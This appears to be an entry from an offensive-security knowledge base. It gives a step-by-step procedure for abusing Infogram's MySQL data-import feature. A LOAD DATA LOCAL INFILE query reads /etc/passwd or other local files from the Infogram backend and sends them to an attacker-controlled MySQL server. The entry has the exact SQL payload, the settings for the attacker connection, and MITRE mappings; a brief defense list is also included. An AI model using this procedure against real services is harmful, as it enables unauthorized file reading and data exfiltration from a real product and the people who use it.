---
tags:
  - lfi
  - mysql
  - infogram
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/load-data-local-infile-lfi]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:22.716Z'
sub_techniques: []
id: bf955b30-6695-4029-aa3b-6f515b7aa32c
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Configure-Malicious-Infogram-MySQL-Connection

## Summary

This procedure configures a malicious MySQL connection in Infogram's data import feature using a LOAD DATA LOCAL INFILE query to trigger LFI and exfiltrate local files to the attacker's server.

## Description

The Infogram application allows users to connect to MySQL databases for data visualization. By injecting a malicious query in the SQL input field and pointing the connection to an attacker-controlled server, the MySQL client on the Infogram backend reads local files and transmits them over the network. This targets sensitive files like /etc/passwd. Prerequisites: Authenticated Infogram session and attacker MySQL server ready. Expected outcome: File contents sent in MySQL packets.

## Requirements

1. Valid Infogram user account
2. Access to infographic editor
3. Attacker-controlled MySQL server details (IP, port, db, user, pass)
4. Web browser for Infogram interaction

## Defense

Defensive measures and detection strategies:

- Validate and sanitize SQL queries in data connection features
- Disable LOAD DATA LOCAL INFILE in MySQL client configurations
- Log and alert on connections to external MySQL hosts from app servers
- Implement query whitelisting to block file read operations

## Objectives

1. Inject LFI payload to read arbitrary local files
2. Redirect connection to attacker server for exfiltration
3. Trigger execution to transmit file data

## Instructions

### Step 1: Navigate to Data Connection

**Context**: Access the MySQL data source setup in the infographic editor.

**Instructions**: Select MySQL as the data source and fill in basic connection fields.

### Step 2: Inject Malicious Query

**Context**: Set the SQL statement to exploit LFI.

**Command** ([[commands/load-data-local-infile-lfi]]):
```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\\n";
```

> Enter this in the SQL SELECT field. Targets /etc/passwd; replace path for other files. Expected output: Query field populated.

### Step 3: Configure Connection Details

**Context**: Point to attacker server.

**Instructions**: Set host to attacker's IP, port 3306, database 'asd', username 'attacker', password 'password'. Click 'Create' to execute.

> Triggers the backend MySQL client. Expected output: UI error, but data exfiltrated.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/load-data-local-infile-lfi]]

## Tools Used


## Tags

- lfi
- mysql
- infogram
